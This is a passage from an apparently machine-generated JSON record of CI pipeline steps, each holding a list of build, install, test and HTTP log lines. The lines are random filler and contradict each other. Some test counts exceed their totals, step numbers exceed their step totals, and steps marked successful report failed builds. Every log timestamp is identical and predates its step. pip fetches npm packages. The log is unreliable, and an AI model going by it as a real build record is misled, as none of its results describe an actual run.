          "WARNING: jest has known vulnerabilities",
          "Compiling components/service.java...",
          "Coverage: 90% statements, 83% branches",
          "\u2713 All checks passed",
          "Uploading artifact 'dist' (32 files)",
          "yarn add: Done in 29.77s",
          "[12:46:23] ERROR: Connection failed",
          "Compiling components/main.py...",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "POST /api - 200 (19ms)",
          "Ran 10 tests in 5s",
          "[12:46:23] WARN: Deprecated API usage",
          "[12:46:23] DEBUG: Memory usage: 1682MB",
          "WARNING: react has known vulnerabilities",
          "Transforming 537 files...",
          "\u2717 build failed with exit code 94",
          "Time: 46.711s",
          "Pulling image: alpine:18",
          "POST /data - 201 (407ms)",
          "Done.",
          "TLS handshake completed",
          "Cache restored successfully (145MB)",
          "Time: 26.913s",
          "GET /status - 200 (30ms)",
          "[12:46:23] DEBUG: Memory usage: 803MB",
          "Minifying vendor.js",
          "Success!",
          "[12:46:23] DEBUG: Connection pool: 11 active",
          "[12:46:23] INFO: Request completed",
          "WARNING: jest has known vulnerabilities",
          "Minifying app.js",
          "Optimizing 92 modules...",
          "[12:46:23] ERROR: Connection failed",
          "WARNING: lodash has known vulnerabilities",
          "Compiling lib/handler.rs...",
          "[12:46:23] DEBUG: Memory usage: 554MB",
          "pip: Downloading express-5.9.tar.gz",
          "Compiling src/service.java...",
          "Generating source maps...",
          "Pulling image: node:18",
          "npm install: added 376 packages",
          "Step 2/18: Testing",
          "WARNING: webpack has known vulnerabilities",
          "Installing axios@4.13.5",
          "npm install: resolved 1108 packages",
          "Snapshots: 47 passed, 10 total",
          "Coverage: 89% statements, 70% branches",
          "Fetching submodules...",
          "Ready.",
          "pip install: Successfully installed lodash-5.15",
          "Time: 44.318s",
          "pip install: Successfully installed react-1.8",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:46:23] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "Verifying...",
          "[12:46:23] WARN: Deprecated API usage",
          "Building Docker image...",
          "Image pulled successfully",
          "Step 9/20: Building",
          "Optimizing 18 modules...",
          "Installing lodash@1.16.10",
          "npm install: resolved 517 packages",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "Already up to date.",
          "Test Suites: 16 passed, 6 total",
          "[12:46:23] DEBUG: Query executed in 80ms",
          "Finished.",
          "\u2717 build failed with exit code 89",
          "Building Docker image...",
          "pip: Downloading lodash-2.13.tar.gz",
          "Completed.",
          "Cache restored successfully (49MB)",
          "Processing...",
          "Processing...",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "POST /api - 201 (135ms)",
          "[12:46:23] INFO: Connecting to database",
          "Step 19/23: Deploying",
          "\u2713 All checks passed",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-14T12:46:29.020565",
        "finished_at": "2025-12-14T12:47:09.341266",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Image pulled successfully",
          "Ran 149 tests in 38s",
          "pip: Collecting lodash",
          "Artifact downloaded: 11MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: prettier has known vulnerabilities",
          "Cache miss for key-4531",
          "WARNING: express has known vulnerabilities",
          "Coverage: 98% statements, 93% branches",
          "\u2713 All checks passed",
          "\u2713 deploy completed",
          "[12:46:23] INFO: Request completed",
          "[12:46:23] DEBUG: Query executed in 88ms",
          "\u2713 Task completed in 1565ms",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Platform: linux-x64",
          "Tests: 118 passed, 120 total",
          "Optimizing 75 modules...",
          "GET /status - 200 (73ms)",
          "Fetching submodules...",
          "\u2713 Task completed in 3370ms",
          "[12:46:23] DEBUG: Memory usage: 1407MB",
          "[12:46:23] DEBUG: Initializing service",
          "POST /data - 202 (357ms)",
          "Processing...",
          "Generating source maps...",
          "Uploading artifact 'coverage' (36 files)",
          "Using Node.js 19.15.0",
          "[12:46:23] WARN: Deprecated API usage",
          "[12:46:23] INFO: Starting build process",
          "WARNING: axios has known vulnerabilities",
          "Minifying vendor.js",
          "[12:46:23] DEBUG: Memory usage: 1785MB",
          "[12:46:23] DEBUG: Loading configuration",
          "Creating production build...",
          "Minifying vendor.js",
          "Processing...",
          "Switched to branch 'hotfix/task-648'",
          "Fetching submodules...",
          "Step 5/23: Testing",
          "Uploading artifact 'dist' (31 files)",
          "Finished.",
          "Pulling image: node:3.11",
          "Coverage: 79% statements, 70% branches",
          "Platform: win32-x64",
          "[12:46:23] INFO: Starting build process",
          "Fetching from https://npmjs.org/package.json",
          "[12:46:23] INFO: Request completed",
          "Step 10/24: Building",
          "[12:46:23] INFO: Starting build process",
          "GET /api - 201 (2ms)",
          "pip: Collecting eslint",
          "npm install: added 185 packages",
          "Optimizing 75 modules...",
          "Installing eslint@3.19.5",
          "Waiting...",
          "Artifact downloaded: 34MB",
          "[12:46:23] DEBUG: Query executed in 40ms",
          "\u2713 deploy completed",
          "Exception: RuntimeError",
          "Fetching submodules...",
          "Exception: TypeError",
          "Compiling components/app.ts...",
          "Step 11/24: Deploying",
          "\u2717 build failed with exit code 56",
          "Artifact downloaded: 31MB",
          "Fetching from https://pypi.org/package.json",
          "Compiling lib/handler.rs...",
          "Fetching submodules...",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Snapshots: 10 passed, 13 total",
          "WARNING: express has known vulnerabilities",
          "Connection established",
          "OK",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Optimizing 90 modules...",
          "\u2713 package completed",
          "[12:46:23] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Success!",
          "WARNING: react has known vulnerabilities",
          "Fetching from https://github.com/package.json",
          "Connection established",
          "Ready.",
          "Optimizing 41 modules...",
          "Bundling styles.css",
          "npm notice: created a lockfile",
          "Switched to branch 'bugfix/task-723'",
          "Time: 118.927s",
          "[12:46:23] DEBUG: Initializing service",
          "Compiling src/handler.rs...",
          "Exception: ValueError",
          "npm notice: package.json updated",
          "npm install: resolved 673 packages",
          "Snapshots: 20 passed, 22 total",
          "Cache miss for key-4345",
          "Compiling components/utils.go...",
          "[12:46:23] DEBUG: Connection pool: 19 active",
          "Connection established",
          "Pulling image: alpine:3.11",
          "Transforming 420 files...",
          "  PASS: integration/test_auth_login.spec.js",
          "Step 5/16: Testing",
          "[12:46:23] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "[12:46:23] INFO: Cache refreshed",
          "Building Docker image...",
          "Environment: development",
          "Artifact uploaded: dist.zip (100MB)",
          "Loading...",
          "Generating source maps...",
          "Platform: darwin-arm64",
          "Cache restored successfully (323MB)",
          "[12:46:23] DEBUG: Query executed in 30ms",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 Step 'build' succeeded",
          "[12:46:23] WARN: Deprecated API usage",
          "Already up to date.",
          "[12:46:23] DEBUG: Query executed in 8ms",
          "Finished.",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 4",
          "Connection established",
          "[12:46:23] DEBUG: Loading configuration",
          "Compiling src/main.py...",
          "Done.",
          "npm notice: created a lockfile",
          "Step 3/19: Installing dependencies",
          "Cache restored successfully (445MB)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "NODE_ENV=test",
          "pip: Downloading react-4.14.tar.gz",
          "Compiling utils/main.py...",
          "pip install: Successfully installed eslint-2.16",
          "POST /api - 200 (166ms)",
          "Switched to branch 'feature/task-555'",
          "Layer 8/9: COPY command",
          "Connection established",
          "Compiling components/utils.go...",
          "Waiting...",
          "Cache hit for key-6903",
          "[12:46:23] WARN: Deprecated API usage",
          "[12:46:23] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "Cache invalidated: build",
          "NODE_ENV=development",
          "Waiting...",
          "NODE_ENV=development",
          "[12:46:23] DEBUG: Memory usage: 1175MB",
          "npm notice: created a lockfile",
          "Processing...",
          "Exception: TypeError",
          "Pushing to registry...",
          "[12:46:23] DEBUG: Connection pool: 15 active",
          "TLS handshake completed",
          "Step 18/18: Running migrations",
          "npm install: resolved 1235 packages",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "\u2713 Task completed in 258ms",
          "Completed.",
          "Step 5/16: Installing dependencies",
          "\u2717 build failed with exit code 19",
          "GET /status - 204 (24ms)",
          "Completed.",
          "Step 18/20: Building",
          "Compiling components/index.js...",
          "[12:46:23] DEBUG: Connection pool: 17 active",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Processing...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-14T12:47:09.341266",
        "finished_at": "2025-12-14T12:47:22.781500",
        "log_lines": [
          "=== Step: type_check ===",
          "Snapshots: 43 passed, 35 total",
          "Optimizing 87 modules...",
          "\u2713 All checks passed",
          "Compiling utils/main.py...",
          "Loading...",
          "Processing...",
          "Environment: test",
          "Ran 100 tests in 48s",
          "Finished.",
          "Step 2/15: Running migrations",
          "Cache hit for key-8403",
          "Step 1/16: Linting",
          "Compiling components/handler.rs...",
          "Cache miss for key-9963",
          "Compiling src/utils.go...",
          "pip: Collecting react",
          "Bundling runtime.css",
          "Step 17/18: Deploying",
          "WARNING: express has known vulnerabilities",
          "Test Suites: 19 passed, 40 total",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Bundling runtime.css",
          "[12:46:23] INFO: Request completed",
          "Step 19/18: Testing",
          "Ran 158 tests in 21s",
          "Completed.",
          "npm notice: created a lockfile",
          "\u2713 Step 'setup' succeeded",
          "Done.",
          "Coverage: 72% statements, 70% branches",
          "Minifying vendor.js",
          "Artifact uploaded: build.tar.gz (7MB)",
          "npm notice: created a lockfile",
          "Uploading artifact 'build' (31 files)",
          "GET /status - 201 (12ms)",
          "Processing...",
          "[12:46:23] DEBUG: Initializing service",
          "Verifying...",
          "Processing...",
          "[12:46:23] DEBUG: Loading configuration",
          "Fetching submodules...",
          "OK",
          "Optimizing 53 modules...",
          "Checking out main branch",
          "Tests: 82 passed, 211 total",
          "Pushing to registry...",
          "Test Suites: 42 passed, 31 total",
          "FAILED: test_db_connect",
          "OK",
          "Tests: 498 passed, 391 total",
          "[12:46:23] DEBUG: Query executed in 40ms",
          "Fetching submodules...",
          "Fetching submodules...",
          "WARNING: jest has known vulnerabilities",
          "Tests: 284 passed, 477 total",
          "Test Suites: 22 passed, 48 total",
          "pip: Downloading express-4.11.tar.gz",
          "pip: Collecting eslint",
          "TLS handshake completed",
          "[12:46:23] DEBUG: Connection pool: 15 active",
          "pip: Installing build dependencies...",
          "Cache miss for key-6805",
          "Success!",
          "[12:46:23] DEBUG: Initializing service",
          "HEAD is now at 1011579",
          "Tests: 251 passed, 133 total",
          "Environment: test",
          "WARNING: webpack has known vulnerabilities",
          "Snapshots: 5 passed, 25 total",
          "Platform: win32-x64",
          "Creating production build...",
          "pip: Collecting eslint",
          "Minifying app.js",
          "Coverage: 88% statements, 61% branches",
          "Compiling src/main.py...",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Cache hit for key-3215",
          "npm install: resolved 1036 packages",
          "[12:46:23] DEBUG: Memory usage: 678MB",
          "Step 3/20: Installing dependencies",
          "Checking out main branch",
          "Success!",
          "  PASS: unit/test_user_create.spec.js",
          "Ran 105 tests in 46s",
          "GET /api - 201 (34ms)",
          "Transforming 437 files...",
          "POST /api - 202 (141ms)",
          "[12:46:23] INFO: Processing request",
          "Step 4/25: Deploying",
          "Using Node.js 19.4.1",
          "WARNING: jest has known vulnerabilities",
          "Pushing to registry...",
          "npm install: added 383 packages",
          "Done.",
          "Test Suites: 16 passed, 33 total",
          "yarn add: Done in 26.4s",
          "Snapshots: 7 passed, 38 total",
          "Building Docker image...",
          "POST /upload - 200 (387ms)",
          "\u2717 build failed with exit code 88",
          "TLS handshake completed",
          "Optimizing 30 modules...",
          "Building Docker image...",
          "npm install: added 74 packages",
          "[12:46:23] WARN: Deprecated API usage",
          "[12:46:23] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "Time: 99.75s",
          "Cache restored successfully (85MB)",
          "Success!",
          "Installing express@4.12.7",
          "Pulling image: node:latest",
          "Completed.",
          "Transforming 924 files...",
          "Step 10/20: Testing",
          "Environment: development",
          "[12:46:23] DEBUG: Connection pool: 15 active",
          "[12:46:23] ERROR: Connection failed",
          "Cache hit for key-6473",
          "[12:46:23] WARN: Deprecated API usage",
          "[12:46:23] DEBUG: Query executed in 46ms",
          "Checking out master branch",
          "Artifact downloaded: 29MB",
          "Success!",
          "Completed.",
          "Completed.",
          "[12:46:23] DEBUG: Initializing service",
          "[12:46:23] DEBUG: Memory usage: 587MB",
          "npm install: resolved 1000 packages",
          "TLS handshake completed",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (8MB)",
          "[12:46:23] DEBUG: Query executed in 96ms",
          "Cache invalidated: dependencies",
          "Finished.",
          "[12:46:23] INFO: Request completed",
          "Compiling utils/service.java...",
          "Installing react@4.15.3",
          "Step 8/22: Deploying",
          "NODE_ENV=production",
          "Compiling src/service.java...",
          "Coverage: 84% statements, 72% branches",
          "\u2713 Task completed in 640ms",
          "POST /upload - 202 (197ms)",
          "Switched to branch 'hotfix/task-587'",
          "Step 6/15: Deploying",
          "[12:46:23] ERROR: Connection failed",
          "[12:46:23] DEBUG: Connection pool: 8 active",
          "Connection established",
          "[12:46:23] DEBUG: Initializing service",
          "\u2713 package completed",
          "Using Node.js 14.6.7",
          "Cache hit for key-4220",
          "Loading...",
          "Fetching from https://registry.npmjs.org/package.json",
          "WARNING: axios has known vulnerabilities",
          "[12:46:23] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Environment: development",
          "npm install: resolved 779 packages",
          "\u2717 build failed with exit code 16",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 22 tests in 35s",
          "npm notice: created a lockfile",
          "NODE_ENV=production",
          "Loading...",
          "Coverage: 98% statements, 84% branches",
          "GET /status - 204 (6ms)",
          "Uploading artifact 'dist' (45 files)",
          "Cache invalidated: dependencies",
          "Cache invalidated: build",
          "[12:46:23] DEBUG: Loading configuration",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-14T12:47:22.781500",
        "finished_at": "2025-12-14T12:47:36.221734",
        "log_lines": [
          "=== Step: setup_node ===",
          "Test Suites: 34 passed, 45 total",
          "Cache restored successfully (320MB)",
          "Artifact downloaded: 39MB",
          "[12:46:23] DEBUG: Connection pool: 6 active",
          "Cache invalidated: build",
          "Finished.",
          "Switched to branch 'feature/task-807'",
          "Cache saved successfully",
          "Connection established",
          "[12:46:23] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Optimizing 86 modules...",
          "pip: Collecting webpack",
          "pip: Downloading eslint-3.13.tar.gz",
          "Artifact uploaded: dist.zip (72MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: prettier has known vulnerabilities",
          "Coverage: 88% statements, 68% branches",
          "Exception: RuntimeError",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:23] ERROR: Connection failed",
          "Installing eslint@4.20.2",
          "Layer 6/15: ENV command",
          "Completed.",
          "Done.",
          "  PASS: integration/test_db_connect.spec.js",
          "WARNING: jest has known vulnerabilities",
          "yarn add: Done in 25.78s",
          "Cache hit for key-4816",
          "Checking out master branch",
          "WARNING: express has known vulnerabilities",
          "[12:46:23] DEBUG: Memory usage: 470MB",
          "Cache miss for key-3248",
          "Fetching from https://amazonaws.com/package.json",
          "Compiling src/main.py...",
          "Step 4/15: Deploying",
          "Artifact uploaded: dist.zip (72MB)",
          "TLS handshake completed",
          "Already up to date.",
          "Step 18/18: Deploying",
          "Test Suites: 32 passed, 40 total",
          "WARNING: eslint has known vulnerabilities",
          "Step 2/23: Running migrations",
          "Step 20/19: Building",
          "Step 5/23: Linting",
          "Building Docker image...",
          "pip install: Successfully installed webpack-5.20",
          "Using Node.js 20.3.10",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:23] INFO: Connecting to database",
          "Platform: darwin-arm64",
          "pip: Installing build dependencies...",
          "[12:46:23] INFO: Cache refreshed",
          "WARNING: eslint has known vulnerabilities",
          "Compiling lib/service.java...",
          "Connection established",
          "Compiling utils/app.ts...",
          "Step 13/20: Building",
          "Finished.",
          "Bundling main.js",
          "Switched to branch 'bugfix/task-901'",
          "OK",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Finished.",
          "Snapshots: 19 passed, 20 total",
          "Success!",
          "Step 3/16: Building",
          "Success!",
          "[12:46:23] DEBUG: Connection pool: 19 active",
          "Pulling image: node:3.11",
          "Loading...",
          "Step 10/16: Running migrations",
          "Using Node.js 18.10.3",
          "Ready.",
          "Step 12/15: Deploying",
          "Pulling image: python:3.11",
          "Platform: linux-x64",
          "Pulling image: node:latest",
          "OK",
          "Generating source maps...",
          "[12:46:23] DEBUG: Query executed in 47ms",
          "Building Docker image...",
          "[12:46:23] WARN: Deprecated API usage",
          "Environment: test",
          "Checking out main branch",
          "Creating production build...",
          "[12:46:23] DEBUG: Query executed in 64ms",
          "pip install: Successfully installed react-5.18",
          "Step 5/20: Testing",
          "Compiling lib/app.ts...",
          "Coverage: 92% statements, 94% branches",
          "[12:46:23] DEBUG: Query executed in 46ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/app.ts...",
          "Fetching submodules...",
          "Cache invalidated: node_modules",
          "Finished.",
          "GET /api - 204 (60ms)",
          "npm notice: package.json updated",
          "[12:46:23] DEBUG: Memory usage: 1849MB",
          "Checking out master branch",
          "Verifying...",
          "Switched to branch 'bugfix/task-611'",
          "Step 13/24: Building",
          "NODE_ENV=development",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:46:23] DEBUG: Connection pool: 10 active",
          "Using Node.js 17.18.7",
          "npm notice: package.json updated",
          "Step 3/16: Installing dependencies",
          "pip: Collecting webpack",
          "[12:46:23] WARN: Deprecated API usage",
          "Step 14/18: Installing dependencies",
          "[12:46:23] INFO: Processing request",
          "Test Suites: 44 passed, 35 total",
          "Transforming 832 files...",
          "Fetching submodules...",
          "Test Suites: 45 passed, 16 total",
          "Cache invalidated: build",
          "WARNING: prettier has known vulnerabilities",
          "Uploading artifact 'dist' (6 files)",
          "Generating source maps...",
          "Snapshots: 8 passed, 46 total",
          "Switched to branch 'bugfix/task-922'",
          "pip install: Successfully installed jest-2.17",
          "Already up to date.",
          "Connection established",
          "Step 12/17: Linting",
          "Finished.",
          "\u2713 All checks passed",
          "Waiting...",
          "pip install: Successfully installed eslint-4.19",
          "Processing...",
          "Compiling utils/utils.go...",
          "Building Docker image...",
          "Processing...",
          "Step 3/17: Testing",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Generating source maps...",
          "Optimizing 93 modules...",
          "Time: 87.483s",
          "[12:46:23] WARN: Deprecated API usage",
          "Time: 72.87s",
          "[12:46:23] INFO: Cache refreshed",
          "Artifact downloaded: 32MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pulling image: python:18",
          "[12:46:23] DEBUG: Initializing service",
          "Tests: 328 passed, 437 total",
          "[12:46:23] INFO: Request completed",
          "Connection established",
          "Switched to branch 'hotfix/task-555'",
          "Done.",
          "[12:46:23] INFO: Starting build process",
          "Success!",
          "Installing eslint@2.2.2",
          "Installing jest@1.9.2",
          "yarn add: Done in 23.38s",
          "Compiling src/utils.go...",
          "Ready.",
          "Step 6/15: Deploying",
          "[12:46:23] WARN: Deprecated API usage",
          "[12:46:23] WARN: Deprecated API usage",
          "yarn add: Done in 23.10s",
          "Compiling utils/handler.rs...",
          "Coverage: 88% statements, 71% branches",
          "WARNING: jest has known vulnerabilities",
          "[12:46:23] WARN: Deprecated API usage",
          "FAILED: test_db_connect",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-14T12:47:36.221734",
        "finished_at": "2025-12-14T12:48:16.542435",
        "log_lines": [
          "=== Step: build ===",
          "pip install: Successfully installed prettier-4.16",
          "Compiling utils/service.java...",
          "Compiling utils/service.java...",
          "Checking out main branch",
          "Using Python 3.12",
          "Compiling src/index.js...",
          "[12:46:23] INFO: Request completed",
          "Step 20/21: Running migrations",
          "[12:46:23] INFO: Processing request",
          "\u2713 Step 'setup' succeeded",
          "Platform: win32-x64",
          "FAILED: test_cache_hit",
          "[12:46:23] INFO: Connecting to database",
          "  PASS: e2e/test_db_connect.spec.js",
          "Platform: linux-x64",
          "npm install: resolved 1957 packages",
          "Using Python 3.12",
          "  PASS: e2e/test_auth_login.spec.js",
          "TLS handshake completed",
          "  PASS: test_api_health (15ms)",
          "Snapshots: 33 passed, 16 total",
          "Cache saved successfully",
          "Bundling vendor.js",
          "GET /api - 200 (79ms)",
          "TLS handshake completed",
          "[12:46:23] DEBUG: Query executed in 59ms",
          "Artifact downloaded: 50MB",
          "pip: Collecting jest",
          "Pushing to registry...",
          "NODE_ENV=test",
          "  PASS: unit/test_cache_hit.spec.js",
          "Using Python 3.10",
          "\u2713 Step 'build' succeeded",
          "Compiling components/handler.rs...",
          "pip: Installing build dependencies...",
          "HEAD is now at e4902c9",
          "Optimizing 97 modules...",
          "\u2713 deploy completed",
          "Step 8/21: Testing",
          "yarn add: Done in 28.73s",
          "\u2713 Task completed in 118ms",
          "Done.",
          "npm notice: package.json updated",
          "Compiling components/index.js...",
          "[12:46:23] DEBUG: Initializing service",
          "WARNING: webpack has known vulnerabilities",
          "Minifying app.js",
          "npm install: resolved 424 packages",
          "GET /api - 201 (30ms)",
          "[12:46:23] DEBUG: Query executed in 70ms",
          "GET /health - 201 (52ms)",
          "npm notice: created a lockfile",
          "\u2713 Step 'test' succeeded",
          "Compiling components/service.java...",
          "Done.",
          "npm install: resolved 1606 packages",
          "Already up to date.",
          "yarn add: Done in 9.42s",
          "Ran 141 tests in 34s",
          "\u2713 All checks passed",
          "[12:46:23] DEBUG: Connection pool: 13 active",
          "Coverage: 91% statements, 62% branches",
          "pip: Collecting lodash",
          "Processing...",
          "Snapshots: 35 passed, 14 total",
          "pip install: Successfully installed react-3.1",
          "Step 15/19: Running migrations",
          "Minifying vendor.js",
          "Cache invalidated: dependencies",
          "Fetching submodules...",
          "Cache hit for key-3540",
          "Using Python 3.10",
          "Connection established",
          "Step 5/16: Building",
          "Installing eslint@3.14.1",
          "Step 4/17: Deploying",
          "Minifying app.js",
          "Step 3/25: Building",
          "Step 1/19: Running migrations",
          "Environment: production",
          "Layer 5/9: RUN command",
          "HEAD is now at 84b9512",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "pip: Downloading eslint-4.15.tar.gz",
          "Pushing to registry...",
          "Platform: linux-x64",
          "Transforming 674 files...",
          "[12:46:23] INFO: Cache refreshed",
          "Compiling components/handler.rs...",
          "npm install: added 304 packages",
          "  PASS: e2e/test_user_create.spec.js",
          "Artifact uploaded: dist.zip (74MB)",
          "Using Python 3.11",
          "Success!",
          "Done.",
          "Image pulled successfully",
          "Environment: production",
          "[12:46:23] INFO: Request completed",
          "  PASS: test_api_health (480ms)",
          "[12:46:23] WARN: Deprecated API usage",
          "WARNING: react has known vulnerabilities",
          "Step 7/25: Linting",
          "Step 6/16: Running migrations",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Pulling image: python:18",
          "WARNING: jest has known vulnerabilities",
          "GET /api - 201 (47ms)",
          "Loading...",
          "Verifying...",
          "npm install: resolved 1236 packages",
          "npm install: resolved 1637 packages",
          "Coverage: 80% statements, 75% branches",
          "[12:46:23] INFO: Processing request",
          "Snapshots: 26 passed, 18 total",
          "WARNING: axios has known vulnerabilities",
          "[12:46:23] DEBUG: Connection pool: 12 active",
          "Done.",
          "Connection established",
          "Optimizing 85 modules...",
          "Snapshots: 9 passed, 37 total",
          "[12:46:23] WARN: Deprecated API usage",
          "Minifying vendor.js",
          "  PASS: test_db_connect (122ms)",
          "\u2713 Task completed in 4523ms",
          "OK",
          "[12:46:23] DEBUG: Memory usage: 1928MB",
          "npm install: added 191 packages",
          "yarn add: Done in 26.10s",
          "Already up to date.",
          "[12:46:23] WARN: Deprecated API usage",
          "Using Python 3.10",
          "WARNING: react has known vulnerabilities",
          "Time: 60.84s",
          "Already up to date.",
          "Generating source maps...",
          "Pushing to registry...",
          "FAILED: test_api_health",
          "Generating source maps...",
          "[12:46:23] DEBUG: Loading configuration",
          "Compiling utils/service.java...",
          "[12:46:23] INFO: Processing request",
          "Fetching submodules...",
          "Fetching from https://gcr.io/package.json",
          "Step 14/16: Deploying",
          "pip: Downloading eslint-4.3.tar.gz",
          "Compiling utils/index.js...",
          "Pushing to registry...",
          "Pushing to registry...",
          "Exception: RuntimeError",
          "Ready.",
          "[12:46:23] DEBUG: Connection pool: 9 active",
          "Step 14/24: Deploying",
          "Already up to date.",
          "[12:46:23] DEBUG: Initializing service",
          "pip install: Successfully installed react-4.17",
          "  PASS: e2e/test_auth_login.spec.js",
          "Time: 75.932s",
          "Using Python 3.10",
          "pip: Installing build dependencies...",
          "Compiling src/index.js...",
          "Checking out main branch",
          "Using Python 3.10",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:46:23] WARN: Deprecated API usage",
          "Step 14/16: Installing dependencies",
          "TLS handshake completed",
          "Already up to date.",
          "Cache restored successfully (127MB)",
          "Cache restored successfully (152MB)",
          "Using Node.js 16.12.5",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-14T12:48:16.542435",
        "finished_at": "2025-12-14T12:48:29.982669",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Checking out master branch",
          "[12:46:23] DEBUG: Connection pool: 9 active",
          "[12:46:23] INFO: Processing request",
          "HEAD is now at e4f83b2",
          "Done.",
          "[12:46:23] DEBUG: Initializing service",
          "Platform: win32-x64",
          "Creating production build...",
          "Bundling vendor.js",
          "NODE_ENV=test",
          "pip: Installing build dependencies...",
          "Ready.",
          "npm install: resolved 1725 packages",
          "  PASS: test_api_health (273ms)",
          "[12:46:23] INFO: Processing request",
          "Minifying vendor.js",
          "WARNING: eslint has known vulnerabilities",
          "Pushing to registry...",
          "Processing...",
          "Creating production build...",
          "Image pulled successfully",
          "Step 10/24: Installing dependencies",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:46:23] INFO: Connecting to database",
          "Ready.",
          "[12:46:23] INFO: Request completed",
          "Step 15/22: Linting",
          "Cache saved successfully",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-782'",
          "Compiling lib/index.js...",
          "Cache saved successfully",
          "Connection established",
          "Layer 10/13: COPY command",
          "Uploading artifact 'coverage' (32 files)",
          "Step 15/21: Linting",
          "\u2713 Task completed in 3190ms",
          "Compiling components/service.java...",
          "[12:46:23] DEBUG: Initializing service",
          "FAILED: test_user_create",
          "pip: Downloading eslint-1.19.tar.gz",
          "Ran 92 tests in 25s",
          "\u2713 All checks passed",
          "Minifying main.js",
          "Creating production build...",
          "Pushing to registry...",
          "[12:46:23] DEBUG: Query executed in 56ms",
          "Artifact uploaded: dist.zip (94MB)",
          "\u2717 build failed with exit code 100",
          "Using Python 3.11",
          "[12:46:23] DEBUG: Loading configuration",
          "[12:46:23] INFO: Cache refreshed",
          "Installing webpack@1.14.5",
          "yarn add: Done in 28.50s",
          "[12:46:23] INFO: Connecting to database",
          "[12:46:23] DEBUG: Loading configuration",
          "[12:46:23] DEBUG: Query executed in 71ms",
          "Success!",
          "Building Docker image...",
          "Compiling lib/index.js...",
          "Verifying...",
          "Ran 75 tests in 53s",
          "Done.",
          "Optimizing 74 modules...",
          "Layer 4/13: ENV command",
          "Installing axios@5.11.1",
          "Uploading artifact 'build' (29 files)",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:23] WARN: Deprecated API usage",
          "GET /health - 200 (21ms)",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:23] INFO: Processing request",
          "Cache miss for key-5865",
          "[12:46:23] INFO: Processing request",
          "[12:46:23] INFO: Request completed",
          "Switched to branch 'bugfix/task-449'",
          "Checking out main branch",
          "Ready.",
          "[12:46:23] INFO: Processing request",
          "Ready.",
          "[12:46:23] DEBUG: Initializing service",
          "[12:46:23] INFO: Starting build process",
          "FAILED: test_db_connect",
          "Step 14/15: Testing",
          "Environment: production",
          "[12:46:23] INFO: Cache refreshed",
          "[12:46:23] INFO: Connecting to database",
          "Switched to branch 'feature/task-595'",
          "\u2713 Step 'build' succeeded",
          "Step 6/21: Linting",
          "Artifact downloaded: 1MB",
          "Step 9/22: Running migrations",
          "Tests: 129 passed, 300 total",
          "Step 9/22: Building",
          "pip: Downloading react-1.6.tar.gz",
          "Creating production build...",
          "[12:46:23] DEBUG: Initializing service",
          "Step 18/15: Installing dependencies",
          "Step 8/20: Deploying",
          "Step 1/24: Building",
          "Cache hit for key-7589",
          "NODE_ENV=development",
          "POST /upload - 201 (302ms)",
          "Cache hit for key-4421",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "Processing...",
          "Compiling src/index.js...",
          "Installing axios@2.5.9",
          "Time: 117.954s",
          "  PASS: test_api_health (207ms)",
          "FAILED: test_cache_hit",
          "[12:46:23] DEBUG: Connection pool: 6 active",
          "Pushing to registry...",
          "NODE_ENV=development",
          "OK",
          "Success!",
          "npm notice: package.json updated",
          "Step 12/21: Testing",
          "Using Node.js 18.15.8",
